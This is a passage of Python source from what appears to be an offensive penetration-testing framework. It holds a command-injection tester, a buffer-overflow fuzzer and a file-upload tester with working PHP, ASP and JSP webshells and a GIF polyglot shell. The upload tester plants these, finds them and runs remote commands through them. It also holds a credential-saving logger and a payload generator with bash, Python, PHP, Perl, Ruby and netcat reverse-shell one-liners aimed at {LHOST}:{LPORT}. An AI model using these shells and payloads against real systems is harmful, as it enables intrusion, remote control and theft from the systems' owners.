            self.parameters = [p.strip() for p in parameters_raw.split(',') if p.strip()]
            if not self.parameters:
                self.parameters = ['cmd']
        method = self.profile['method']
        if method == 'auto':
            method = 'post' if self.base_body else 'get'
        self.method = 'POST' if method == 'post' else 'GET'
        return True

    def _build_plan(self, payloads):
        plan = []
        for parameter in self.parameters:
            for payload in payloads[: self.profile['max_payloads'] or len(payloads)]:
                plan.append({'parameter': parameter, 'payload': payload})
        plan = plan[: self.profile['max_total_payloads']]
        self.plan_size = len(plan)
        return plan

    def _execute_task(self, task):
        payload = task['payload']
        params = dict(self.base_params)
        data = dict(self.base_body)
        encoded_payload = CommandPayloadEncoder.apply(payload.payload, self.profile['encoder'])
        location = self.profile['injection_location']
        target_param = task['parameter']
        if location in {'query', 'both'} or (location == 'auto' and (target_param in params or self.method == 'GET')):
            params[target_param] = encoded_payload
            applied_location = 'query'
        else:
            data[target_param] = encoded_payload
            applied_location = 'body'
        if self.rate_limiter:
            self.rate_limiter.wait_if_needed()
        if self.profile['throttle']:
            time.sleep(self.profile['throttle'])
        response_meta = self._send_request(params, data)
        if not response_meta:
            return {'error': f'No response for {target_param}'}
        evidence = self.analyzer.evaluate(payload, response_meta)
        if evidence:
            return CommandInjectionFinding(
                parameter=target_param,
                payload_name=payload.name,
                os=payload.os,
                evidence=evidence['evidence'],
                severity=evidence['severity'],
                indicator=evidence['indicator'],
                elapsed=response_meta.elapsed,
                status_code=response_meta.status,
                payload=payload.payload,
                marker=payload.marker,
                location=applied_location
            )
        return None

    def _send_request(self, params, data):
        try:
            start = time.perf_counter()
            response = self.session.request(
                self.method,
                self.base_url,
                params=params if self.method == 'GET' else None,
                data=data if self.method == 'POST' else None,
                headers=self.profile['headers'],
                cookies=self.profile['cookies'],
                timeout=self.profile['timeout'],
                verify=self.profile['verify_ssl'],
                proxies=self.profile['proxies'],
                allow_redirects=True
            )
            elapsed = time.perf_counter() - start
            snippet = response.text[:8000] if response.text else ''
            return HTTPResponseMeta(
                status=response.status_code,
                length=len(response.content or b''),
                elapsed=elapsed,
                snippet=snippet
            )
        except Exception as exc:
            sanitized = str(exc).split('\n')[0][:200]
            if self.logger:
                self.logger.log(f"Command injection request error: {sanitized}", 'WARNING')
            return None


@dataclass
class BufferOverflowPayload:
    """Payload specification for buffer overflow testing"""
    name: str
    data: bytes
    length: int
    vector: str
    description: str
    cyclic: bool = False

    def preview(self, size=24):
        snippet = self.data[:size]
        return snippet.decode('latin-1', errors='ignore').replace('\r', ' ').replace('\n', ' ')


@dataclass
class BufferOverflowFinding:
    """Structured result of a buffer overflow probe"""
    payload_name: str
    length: int
    indicator: str
    severity: str
    evidence: str
    vector: str
    crash: bool
    timestamp: float
    attempts: int


class CyclicPatternGenerator:
    """Generate and analyze cyclic patterns for offset discovery"""

    def __init__(self):
        self.charset_upper = string.ascii_uppercase
        self.charset_lower = string.ascii_lowercase
        self.charset_digits = string.digits

    def generate(self, length):
        if length <= 0:
            return ''
        chunks = []
        total = 0
        for a in self.charset_upper:
            for b in self.charset_lower:
                for c in self.charset_digits:
                    chunk = f"{a}{b}{c}"
                    chunks.append(chunk)
                    total += len(chunk)
                    if total >= length:
                        return ''.join(chunks)[:length]
        return ''.join(chunks)[:length]

    def find_offset(self, value, search_space=8192):
        if not value:
            return None
        candidate_strings = []
        if isinstance(value, bytes):
            candidate_strings.append(value.decode('latin-1', errors='ignore'))
            candidate_strings.append(value[::-1].decode('latin-1', errors='ignore'))
        else:
            token = str(value).strip()
            if token.startswith('0x'):
                token = token[2:]
            token = token.replace(' ', '')
            if len(token) % 2 == 1:
                token = '0' + token
            try:
                raw = bytes.fromhex(token)
                candidate_strings.append(raw.decode('latin-1', errors='ignore'))
                candidate_strings.append(raw[::-1].decode('latin-1', errors='ignore'))
            except ValueError:
                candidate_strings.append(str(value))
        haystack = self.generate(search_space)
        for candidate in candidate_strings:
            idx = haystack.find(candidate)
            if idx != -1:
                return idx
        return None


class BufferOverflowPayloadPlanner:
    """Construct payload plans based on configured strategies"""

    def __init__(self, profile):
        self.profile = profile
        self.cyclic = CyclicPatternGenerator()

    def build(self):
        strategies = self.profile['payload_strategy']
        payloads: List[BufferOverflowPayload] = []
        limit = self.profile['max_payloads']

        def append(payload):
            if limit and len(payloads) >= limit:
                return False
            payloads.append(payload)
            return True

        if 'progressive' in strategies:
            length = self.profile['start_length']
            while length <= self.profile['max_length']:
                data = ('A' * length).encode(self.profile['encoding'], errors='ignore')
                if not append(BufferOverflowPayload(
                        name=f"progressive_{length}",
                        data=data,
                        length=length,
                        vector='progressive',
                        description=f"Linear filler length {length}")):
                    break
                length += self.profile['step_length']
        if 'custom-lengths' in strategies and self.profile['custom_lengths']:
            for length in self.profile['custom_lengths']:
                data = ('B' * length).encode(self.profile['encoding'], errors='ignore')
                if not append(BufferOverflowPayload(
                        name=f"custom_len_{length}",
                        data=data,
                        length=length,
                        vector='custom-length',
                        description=f"Operator supplied length {length}")):
                    break
        if 'custom-payloads' in strategies and self.profile['custom_payloads']:
            for idx, entry in enumerate(self.profile['custom_payloads'], 1):
                encoded = entry.encode(self.profile['encoding'], errors='ignore')
                if not append(BufferOverflowPayload(
                        name=f"custom_payload_{idx}",
                        data=encoded,
                        length=len(encoded),
                        vector='custom',
                        description='Operator supplied payload')):
                    break
        if 'cyclic' in strategies:
            pattern = self.cyclic.generate(self.profile['cyclic_length'])
            encoded = pattern.encode(self.profile['encoding'], errors='ignore')
            append(BufferOverflowPayload(
                name=f"cyclic_{self.profile['cyclic_length']}",
                data=encoded,
                length=len(encoded),
                vector='cyclic',
                description='Cyclic pattern for offset analysis',
                cyclic=True
            ))
        return payloads


class AdvancedBufferOverflowTester:
    """High-performance buffer overflow tester with structured analysis"""

    def __init__(self, profile, framework=None):
        self.profile = profile
        self.framework = framework
        self.rate_limiter = getattr(framework, 'rate_limiter', None)
        self.logger = getattr(framework, 'logger', None)
        self.planner = BufferOverflowPayloadPlanner(profile)
        self.errors = []

    def execute(self):
        payloads = self.planner.build()
        if not payloads:
            return {'payloads': [], 'findings': [], 'errors': [{'error': 'No payloads generated'}], 'duration': 0.0, 'requests': 0, 'offset_hint': None}
        findings: List[BufferOverflowFinding] = []
        start = time.time()
        requests = 0
        crash_detected = False
        payload_iter = iter(payloads)
        future_map = {}
        all_submitted = False
        max_workers = max(1, self.profile['threads'])
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            while True:
                while not all_submitted and len(future_map) < max_workers:
                    if crash_detected and self.profile['stop_on_crash']:
                        all_submitted = True
                        break
                    try:
                        payload = next(payload_iter)
                    except StopIteration:
                        all_submitted = True
                        break
                    future = executor.submit(self._exercise_payload, payload)
                    future_map[future] = payload
                if not future_map:
                    break
                done, _ = concurrent.futures.wait(list(future_map.keys()), return_when=concurrent.futures.FIRST_COMPLETED)
                for future in done:
                    payload = future_map.pop(future, None)
                    if payload is None:
                        continue
                    outcome = None
                    try:
                        outcome = future.result()
                    except Exception as exc:
                        outcome = {'error': f"Unhandled worker error for {payload.name}: {str(exc)[:120]}"}
                    requests += 1
                    crash_detected = self._process_outcome(outcome, findings) or crash_detected
                    if crash_detected and self.profile['stop_on_crash']:
                        for pending in future_map:
                            pending.cancel()
                        future_map.clear()
                        break
                if crash_detected and self.profile['stop_on_crash']:
                    break
            for future, payload in list(future_map.items()):
                try:
                    outcome = future.result()
                except Exception as exc:
                    outcome = {'error': f"Unhandled worker error for {payload.name}: {str(exc)[:120]}"}
                requests += 1
                self._process_outcome(outcome, findings)
                future_map.pop(future, None)
        duration = time.time() - start
        offset_hint = None
        if self.profile['offset_value']:
            offset_hint = self.planner.cyclic.find_offset(self.profile['offset_value'], self.profile['max_length'])
        return {
            'payloads': payloads,
            'findings': findings,
            'errors': self.errors,
            'duration': duration,
            'requests': requests,
            'offset_hint': offset_hint
        }

    def _process_outcome(self, outcome, findings):
        if isinstance(outcome, BufferOverflowFinding):
            findings.append(outcome)
            return outcome.crash
        if isinstance(outcome, dict) and outcome.get('error'):
            self.errors.append(outcome)
        return False

    def _exercise_payload(self, payload: BufferOverflowPayload):
        attempts = 0
        last_error = None
        total_attempts = max(0, self.profile['max_retries']) + 1
        while attempts < total_attempts:
            attempts += 1
            if self.rate_limiter:
                self.rate_limiter.wait_if_needed()
            if self.profile['settle_delay'] > 0:
                time.sleep(self.profile['settle_delay'])
            try:
                return self._send_payload(payload, attempts)
            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, socket.timeout, OSError) as exc:
                last_error = f"{type(exc).__name__}: {str(exc)[:160]}"
                continue
        return {'error': f"{payload.name}: {last_error or 'Unknown transmission error'}"}

    def _send_payload(self, payload: BufferOverflowPayload, attempts):
        proto = socket.SOCK_DGRAM if self.profile['protocol'] == 'udp' else socket.SOCK_STREAM
        family = socket.AF_INET6 if ':' in self.profile['host'] and not self.profile['host'].count('.') == 3 else socket.AF_INET
        with socket.socket(family, proto) as sock:
            sock.settimeout(self.profile['connection_timeout'])
            if proto == socket.SOCK_STREAM:
                sock.connect((self.profile['host'], self.profile['port']))
            target_addr = (self.profile['host'], self.profile['port'])
            if proto == socket.SOCK_DGRAM:
                sock.connect(target_addr)
            rendered = self._render_command(payload)
            sock.sendall(rendered)
            sock.settimeout(self.profile['response_timeout'])
            indicator = 'response'
            evidence = ''
            try:
                data = sock.recv(2048)
                if not data:
                    indicator = 'connection closed'
                else:
                    evidence = data[:200].decode('latin-1', errors='ignore').strip()
            except socket.timeout:
                indicator = 'no response'
                evidence = 'Socket timeout'
            crash = self._is_crash_indicator(indicator)
            severity = 'Critical' if crash else ('Info' if indicator == 'response' else 'Medium')
            return BufferOverflowFinding(
                payload_name=payload.name,
                length=payload.length,
                indicator=indicator,
                severity=severity,
                evidence=evidence or payload.preview(),
                vector=payload.vector,
                crash=crash,
                timestamp=time.time(),
                attempts=attempts
            )

    def _is_crash_indicator(self, indicator):
        check = indicator.lower()
        for token in self.profile['crash_indicators']:
            if token in check:
                return True
        return False

    def _render_command(self, payload: BufferOverflowPayload):
        template = self.profile['command_template'] or '{{PAYLOAD}}'
        normalized = template.replace('\\r', '\r').replace('\\n', '\n').replace('\\t', '\t')
        payload_text = payload.data.decode(self.profile['encoding'], errors='ignore')
        if '{{PAYLOAD}}' in normalized:
            merged = normalized.replace('{{PAYLOAD}}', payload_text)
        else:
            merged = normalized + payload_text
        return merged.encode(self.profile['encoding'], errors='ignore')


@dataclass
class FileUploadPayload:
    """Representation of a crafted upload payload"""
    name: str
    filename: str
    content: bytes
    content_type: str
    description: str
    vector: str
    marker: str
    path_hint: str
    exec_capable: bool = False


@dataclass
class FileUploadFinding:
    """Captures confirmed file upload results"""
    payload_name: str
    parameter: str
    severity: str
    indicator: str
    evidence: str
    verification: str
    access_url: Optional[str]
    status_code: int
    response_time: float
    vector: str


class FileUploadPayloadFactory:
    """Generate evasive upload payloads"""

    def __init__(self):
        self.templates = {
            'php_basic': {
                'filename': 'shell_{rand}.php',
                'content': "<?php echo '{MARK}:'; $cmd=$_REQUEST['cmd'] ?? 'id'; system($cmd); ?>",
                'content_type': 'application/x-httpd-php',
                'vector': 'webshell',
                'path_hint': 'uploads',
                'exec_capable': True,
                'description': 'Compact PHP command shell'
            },
            'php_polyglot': {
                'filename': 'image_{rand}.php.jpg',
                'content': "GIF89a<?php /*{MARK}*/ echo shell_exec($_REQUEST['cmd'] ?? 'id'); ?>",
                'content_type': 'image/jpeg',
                'vector': 'polyglot',
                'path_hint': 'images',
                'exec_capable': True,
                'description': 'GIF header polyglot webshell'
            },
            'asp_shell': {
                'filename': 'shell_{rand}.asp',
                'content': "<% Response.Write(\">>>{MARK}<<<\"); Dim cmd, so:Set so=Server.CreateObject(\"WScript.Shell\"):cmd=Request(\"cmd\"):If cmd<>\"\" Then Response.Write(so.Exec(cmd).StdOut.ReadAll()) End If %>",
                'content_type': 'text/plain',
                'vector': 'webshell',
                'path_hint': 'uploads',
                'exec_capable': True,
                'description': 'Classic ASP command shell'
            },
            'jsp_shell': {
                'filename': 'shell_{rand}.jsp',
                'content': "<%@ page import=\"java.io.*\" %><% String c=request.getParameter(\"cmd\"); if(c!=null){ out.println(\"{MARK}\"); Process p=Runtime.getRuntime().exec(c); InputStream in=p.getInputStream(); int a; while((a=in.read())!=-1){ out.print((char)a); } } %>",
                'content_type': 'text/plain',
                'vector': 'webshell',
                'path_hint': 'uploads',
                'exec_capable': True,
                'description': 'Lightweight JSP shell'
            },
            'htaccess_php': {
                'filename': '.htaccess',
                'content': "AddType application/x-httpd-php .jpg\nAddHandler application/x-httpd-php .jpg\n# {MARK}",
                'content_type': 'text/plain',
                'vector': 'config',
                'path_hint': '',
                'exec_capable': False,
                'description': 'Force PHP interpretation of JPG files'
            },
            'web_config': {
                'filename': 'web.config',
                'content': "<?xml version='1.0'?><configuration><!--{MARK}--><system.webServer><handlers><add name='jpg' path='*.jpg' verb='*' modules='IsapiModule' scriptProcessor='c:/php/php-cgi.exe' resourceType='Unspecified' requireAccess='Script' preCondition='bitness32' /></handlers></system.webServer></configuration>",
                'content_type': 'application/xml',
                'vector': 'config',
                'path_hint': '',
                'exec_capable': False,
                'description': 'IIS handler override'
            },
            'txt_probe': {
                'filename': 'probe_{rand}.txt',
                'content': 'Upload proof {MARK}',
                'content_type': 'text/plain',
                'vector': 'probe',
                'path_hint': 'files',
                'exec_capable': False,
                'description': 'Simple text beacon for disclosure'
            },
            'xml_probe': {
                'filename': 'payload_{rand}.xml',
                'content': '<root proof="{MARK}">test</root>',
                'content_type': 'application/xml',
                'vector': 'probe',
                'path_hint': 'data',
                'exec_capable': False,
                'description': 'XML payload for filter bypass'
            }
        }
        self.profiles = {
            'stealth': ['txt_probe', 'xml_probe', 'php_polyglot'],
            'balanced': ['php_basic', 'php_polyglot', 'txt_probe', 'htaccess_php'],
            'aggressive': ['php_basic', 'php_polyglot', 'htaccess_php', 'web_config', 'asp_shell', 'jsp_shell']
        }

    def generate(self, profile_name, max_payloads, webshell_type, custom_payload):
        selected = self.profiles.get(profile_name, self.profiles['balanced'])
        payloads: List[FileUploadPayload] = []
        prioritized = self._prioritize_by_webshell(selected, webshell_type)
        for key in prioritized:
            template = self.templates.get(key)
            if not template:
                continue
            marker = secrets.token_hex(6)
            filename = template['filename'].replace('{rand}', secrets.token_hex(3))
            content = template['content'].replace('{MARK}', marker)
            payloads.append(FileUploadPayload(
                name=key,
                filename=filename,
                content=content.encode('utf-8'),
                content_type=template['content_type'],
                description=template['description'],
                vector=template['vector'],
                marker=marker,
                path_hint=template['path_hint'],
                exec_capable=template['exec_capable']
            ))
        if custom_payload:
            marker = secrets.token_hex(6)
            filename = f"custom_{marker}.txt"
            payloads.append(FileUploadPayload(
                name='custom',
                filename=filename,
                content=str(custom_payload).replace('{MARK}', marker).encode('utf-8'),
                content_type='text/plain',
                description='Operator supplied payload',
                vector='custom',
                marker=marker,
                path_hint='',
                exec_capable=True
            ))
        if max_payloads:
            payloads = payloads[:max_payloads]
        return payloads

    def _prioritize_by_webshell(self, sequence, webshell_type):
        if webshell_type in {'php', 'asp', 'jsp'}:
            preferred = []
            for key in sequence:
                if webshell_type == 'php' and key.startswith('php'):
                    preferred.append(key)
                elif webshell_type == 'asp' and 'asp' in key:
                    preferred.append(key)
                elif webshell_type == 'jsp' and 'jsp' in key:
                    preferred.append(key)
            remainder = [key for key in sequence if key not in preferred]
            return preferred + remainder
        return sequence


class FileUploadResponseAnalyzer:
    """Decide whether an upload was likely accepted"""

    def __init__(self, keywords, allow_status):
        self.keywords = [kw.lower() for kw in keywords if kw]
        self.allow_status = set(allow_status)

    def evaluate(self, payload, response_meta: HTTPResponseMeta):
        snippet = (response_meta.snippet or '')[:4000]
        snippet_lower = snippet.lower()
        if response_meta.status in self.allow_status:
            indicator = f"status:{response_meta.status}"
            evidence = snippet[:160] or 'upload endpoint accepted payload'
            severity = 'Medium'
        elif any(keyword in snippet_lower for keyword in self.keywords):
            indicator = 'keyword'
            evidence = self._extract_keyword(snippet, snippet_lower)
            severity = 'Medium'
        else:
            return None
        return {
            'indicator': indicator,
            'evidence': evidence,
            'severity': severity
        }

    def _extract_keyword(self, snippet, lowered):
        for keyword in self.keywords:
            idx = lowered.find(keyword)
            if idx != -1:
                start = max(0, idx - 60)
                end = min(len(snippet), idx + len(keyword) + 60)
                return snippet[start:end]
        return snippet[:120]


class AdvancedFileUploadTester:
    """High-assurance file upload evaluator"""

    DEFAULT_DIRECTORIES = ['uploads', 'upload', 'files', 'images', 'media', 'public', 'assets', 'temp', 'tmp']

    def __init__(self, profile, framework=None):
        self.profile = profile
        self.framework = framework
        self.payload_factory = FileUploadPayloadFactory()
        self.session = requests.Session()
        self.logger = getattr(framework, 'logger', None)
        self.rate_limiter = profile.get('rate_limiter') or getattr(framework, 'rate_limiter', None)
        self.response_analyzer = FileUploadResponseAnalyzer(profile['success_keywords'], profile['allow_status'])
        self.errors = []
        self.request_count = 0
        self._request_lock = threading.Lock()
        self.base_directory = ''
        self.verify_paths: List[str] = []

    def execute(self):
        if not self._prepare_environment():
            return {'payloads': [], 'findings': [], 'errors': self.errors, 'duration': 0.0, 'requests': self.request_count}
        payloads = self.payload_factory.generate(
            self.profile['payload_profile'],
            self.profile['max_payloads'],
            self.profile['webshell_type'],
            self.profile['custom_payload']
        )
        if not payloads:
            self.errors.append({'error': 'No payloads generated for selected profile'})
            return {'payloads': [], 'findings': [], 'errors': self.errors, 'duration': 0.0, 'requests': self.request_count}
        findings = []
        start = time.time()
        for payload in payloads:
            finding = self._upload_payload(payload)
            if isinstance(finding, FileUploadFinding):
                findings.append(finding)
        duration = time.time() - start
        return {'payloads': payloads, 'findings': findings, 'errors': self.errors, 'duration': duration, 'requests': self.request_count}

    def _prepare_environment(self):
        parsed = urlparse(self.profile['url'])
        if parsed.scheme not in {'http', 'https'}:
            self.errors.append({'error': 'Invalid URL scheme for upload target'})
            return False
        clean_path = parsed.path or '/'
        if clean_path.endswith('/'):
            base_path = clean_path
        else:
            base_path = clean_path.rsplit('/', 1)[0] + '/'
        self.base_directory = urljoin(f"{parsed.scheme}://{parsed.netloc}", base_path)
        verify_paths = self.profile['verify_paths']
        if verify_paths == 'auto' or verify_paths == ['auto']:
            self.verify_paths = self.DEFAULT_DIRECTORIES
        else:
            cleaned = [entry.strip().strip('/') for entry in verify_paths if entry.strip()]
            self.verify_paths = cleaned or self.DEFAULT_DIRECTORIES
        return True

    def _upload_payload(self, payload: FileUploadPayload):
        files = {
            self.profile['parameter']: (payload.filename, payload.content, payload.content_type)
        }
        data = dict(self.profile['extra_fields'])
        headers = dict(self.profile['headers'])
        try:
            if self.rate_limiter:
                self.rate_limiter.wait_if_needed()
            if self.profile['throttle']:
                time.sleep(self.profile['throttle'])
            start = time.perf_counter()
            if self.profile['method'] == 'put':
                response = self.session.put(
                    self.profile['url'],
                    data=payload.content,
                    headers=headers,
                    timeout=self.profile['timeout'],
                    verify=self.profile['verify_ssl'],
                    cookies=self.profile['cookies'],
                    proxies=self.profile['proxies'],
                    allow_redirects=True
                )
            else:
                response = self.session.post(
                    self.profile['url'],
                    files=files,
                    data=data,
                    headers=headers,
                    timeout=self.profile['timeout'],
                    verify=self.profile['verify_ssl'],
                    cookies=self.profile['cookies'],
                    proxies=self.profile['proxies'],
                    allow_redirects=True
                )
            elapsed = time.perf_counter() - start
            self._increment_requests()
            snippet = (response.text or '')[:4000]
            response_meta = HTTPResponseMeta(
                status=response.status_code,
                length=len(response.content or b''),
                elapsed=elapsed,
                snippet=snippet
            )
        except Exception as exc:
            sanitized = str(exc).split('\n')[0][:160]
            self.errors.append({'error': f"Upload failed for {payload.name}: {sanitized}"})
            return None
        indicator = self.response_analyzer.evaluate(payload, response_meta)
        if not indicator:
            return None
        verification = self._verify_payload_access(payload)
        if verification:
            indicator.update(verification)
        else:
            indicator.update({'verification': 'response-only', 'access_url': None})
        finding = FileUploadFinding(
            payload_name=payload.name,
            parameter=self.profile['parameter'],
            severity=indicator.get('severity', 'Medium'),
            indicator=indicator.get('indicator', 'status'),
            evidence=indicator.get('evidence', ''),
            verification=indicator.get('verification', 'response-only'),
            access_url=indicator.get('access_url'),
            status_code=response_meta.status,
            response_time=response_meta.elapsed,
            vector=payload.vector
        )
        return finding

    def _verify_payload_access(self, payload: FileUploadPayload):
        candidates = self._build_candidate_urls(payload)
        if not candidates:
            return None
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.profile['threads']) as executor:
            futures = {executor.submit(self._probe_candidate, url, payload): url for url in candidates}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    return result
        return None

    def _probe_candidate(self, url, payload):
        try:
            response = requests.get(
                url,
                headers=self.profile['headers'],
                cookies=self.profile['cookies'],
                timeout=self.profile['verify_timeout'],
                verify=self.profile['verify_ssl'],
                proxies=self.profile['proxies'],
                allow_redirects=True
            )
            self._increment_requests()
        except Exception:
            return None
        if response.status_code != 200:
            return None
        body = response.text if isinstance(response.text, str) else ''
        if payload.marker.lower() in body.lower():
            verification = {
                'indicator': 'retrieval',
                'evidence': f"Marker observed at {url}",
                'severity': 'High',
                'verification': 'retrieval',
                'access_url': url
            }
            if payload.exec_capable and self.profile['auto_shell_verify']:
                shell_result = self._attempt_remote_command(url)
                if shell_result:
                    return shell_result
            return verification
        return None

    def _attempt_remote_command(self, base_url):
        try:
            response = requests.get(
                base_url,
                params={self.profile['shell_param']: self.profile['shell_command']},
                headers=self.profile['headers'],
                cookies=self.profile['cookies'],
                timeout=self.profile['verify_timeout'],
                verify=self.profile['verify_ssl'],
                proxies=self.profile['proxies'],
                allow_redirects=True
            )
            self._increment_requests()
        except Exception:
            return None
        snippet = (response.text or '')[:4000].lower()
        for indicator in self.profile['shell_success_indicators']:
            if indicator.lower() in snippet:
                return {
                    'indicator': 'remote-shell',
                    'evidence': f"Command execution indicator '{indicator}' detected",
                    'severity': 'Critical',
                    'verification': 'remote-shell',
                    'access_url': response.url
                }
        return None

    def _build_candidate_urls(self, payload: FileUploadPayload):
        directories = []
        if payload.path_hint:
            directories.append(payload.path_hint)
        directories.extend(self.verify_paths)
        directories.append('')
        seen = []
        for directory in directories:
            normalized = directory.strip('/')
            if normalized:
                candidate = f"{self.base_directory.rstrip('/')}/{normalized}/{payload.filename}"
            else:
                candidate = f"{self.base_directory.rstrip('/')}/{payload.filename}"
            candidate = candidate.replace('//', '/').replace(':/', '://')
            if candidate not in seen:
                seen.append(candidate)
        return seen

    def _increment_requests(self, amount=1):
        with self._request_lock:
            self.request_count += amount


def retry_on_failure(max_retries=3, delay=1, backoff=2):
    """Decorator for retrying failed operations"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            retries = 0
            current_delay = delay
            
            while retries < max_retries:
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    retries += 1
                    if retries >= max_retries:
                        raise
                    
                    print(f"{Fore.YELLOW}[*] Retry {retries}/{max_retries} after {current_delay}s...{Style.RESET_ALL}")
                    time.sleep(current_delay)
                    current_delay *= backoff
            
        return wrapper
    return decorator

class Logger:
    """Enhanced logging system with rotation and encryption"""
    def __init__(self):
        self.log_file = f"kndys_session_{int(time.time())}.log"
        self.session_file = f"kndys_session_{int(time.time())}.json"
        self.max_log_size = 10 * 1024 * 1024 # 10MB
        self.lock = threading.Lock()
        
        # Setup Python logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] %(message)s',
            handlers=[
                logging.FileHandler(self.log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.python_logger = logging.getLogger('KNDYS')
        
    def log(self, message, level="INFO"):
        """Log message to file with rotation"""
        with self.lock:
            try:
                # Check log file size and rotate if needed
                if os.path.exists(self.log_file):
                    if os.path.getsize(self.log_file) > self.max_log_size:
                        self.rotate_log()
                
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_entry = f"[{timestamp}] [{level}] {message}"
                
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(log_entry + "\n")
                
                # Also use Python logging
                log_level = getattr(logging, level, logging.INFO)
                self.python_logger.log(log_level, message)
                    
                # Save to session file
                self.save_session(message)
            except Exception as e:
                print(f"{Fore.RED}[!] Logging error: {str(e)}{Style.RESET_ALL}")
    
    def rotate_log(self):
        """Rotate log file when it gets too large"""
        try:
            timestamp = int(time.time())
            backup_file = f"{self.log_file}.{timestamp}"
            shutil.move(self.log_file, backup_file)
            print(f"{Fore.YELLOW}[*] Log rotated to {backup_file}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Log rotation failed: {str(e)}{Style.RESET_ALL}")
        
    def save_session(self, data):
        """Save data to session file with error handling"""
        try:
            if os.path.exists(self.session_file):
                with open(self.session_file, 'r', encoding='utf-8') as f:
                    session_data = json.load(f)
            else:
                session_data = {
                    "actions": [], 
                    "findings": [], 
                    "credentials": [],
                    "errors": [],
                    "start_time": datetime.now().isoformat()
                }
                
            session_data["actions"].append({
                "timestamp": datetime.now().isoformat(),
                "data": str(data)[:1000] # Limit data size
            })
            
            with open(self.session_file, 'w', encoding='utf-8') as f:
                json.dump(session_data, f, indent=2)
        except Exception as e:
            # Silent fail for session save to not interrupt operations
            pass
    
    def save_finding(self, finding_type, data):
        """Save security finding"""
        try:
            if os.path.exists(self.session_file):
                with open(self.session_file, 'r', encoding='utf-8') as f:
                    session_data = json.load(f)
            else:
                session_data = {"actions": [], "findings": [], "credentials": []}
            
            session_data["findings"].append({
                "timestamp": datetime.now().isoformat(),
                "type": finding_type,
                "data": data
            })
            
            with open(self.session_file, 'w', encoding='utf-8') as f:
                json.dump(session_data, f, indent=2)
        except:
            pass
    
    def save_credential(self, username, password, source):
        """Save captured credential"""
        try:
            if os.path.exists(self.session_file):
                with open(self.session_file, 'r', encoding='utf-8') as f:
                    session_data = json.load(f)
            else:
                session_data = {"actions": [], "findings": [], "credentials": []}
            
            session_data["credentials"].append({
                "timestamp": datetime.now().isoformat(),
                "username": username,
                "password": hashlib.sha256(password.encode()).hexdigest(), # Hash for security
                "source": source
            })
            
            with open(self.session_file, 'w', encoding='utf-8') as f:
                json.dump(session_data, f, indent=2)
        except:
            pass

class ExploitDB:
    """Local exploit database"""
    def __init__(self):
        self.exploits = self.load_exploits()
        
    def load_exploits(self):
        """Load exploit database"""
        exploits = {
            # Web exploits
            "web": [
                {
                    "id": "EX-001",
                    "name": "SQL Injection Classic",
                    "description": "Classic SQL injection attack",
                    "type": "web",
                    "port": 80,
                    "payload": "' OR '1'='1' --"
                },
                {
                    "id": "EX-002",
                    "name": "XSS Reflected",
                    "description": "Reflected Cross-Site Scripting",
                    "type": "web",
                    "port": 80,
                    "payload": "<script>alert('XSS')</script>"
                },
                {
                    "id": "EX-003",
                    "name": "Command Injection",
                    "description": "OS Command Injection",
                    "type": "web",
                    "port": 80,
                    "payload": "; ls -la"
                }
            ],
            # Network exploits
            "network": [
                {
                    "id": "EX-101",
                    "name": "SMB EternalBlue",
                    "description": "MS17-010 SMB Vulnerability",
                    "type": "network",
                    "port": 445,
                    "payload": "eternalblue"
                },
                {
                    "id": "EX-102",
                    "name": "Heartbleed",
                    "description": "OpenSSL Heartbleed Vulnerability",
                    "type": "network",
                    "port": 443,
                    "payload": "heartbleed"
                }
            ],
            # Service-specific exploits
            "services": [
                {
                    "id": "EX-201",
                    "name": "FTP Anonymous Login",
                    "description": "FTP server with anonymous login enabled",
                    "type": "service",
                    "port": 21,
                    "payload": "anonymous"
                },
                {
                    "id": "EX-202",
                    "name": "SSH Brute Force",
                    "description": "SSH password brute force attack",
                    "type": "service",
                    "port": 22,
                    "payload": "ssh_brute"
                }
            ]
        }
        return exploits
        
    def search_exploits(self, query):
        """Search for exploits"""
        results = []
        for category, exploit_list in self.exploits.items():
            for exploit in exploit_list:
                if query.lower() in exploit["name"].lower() or query.lower() in exploit["description"].lower():
                    results.append(exploit)
        return results

class PayloadGenerator:
    """Payload generation system"""
    def __init__(self):
        self.payloads = {}
        self.load_payloads()
        
    def load_payloads(self):
        """Load all payload templates"""
        self.payloads = {
            # Reverse Shells
            "reverse_shell": {
                "bash": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
                "python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
                "python3": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
                "php": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "perl": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                "nc": "nc -e /bin/sh {LHOST} {LPORT}",
                "nc_traditional": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
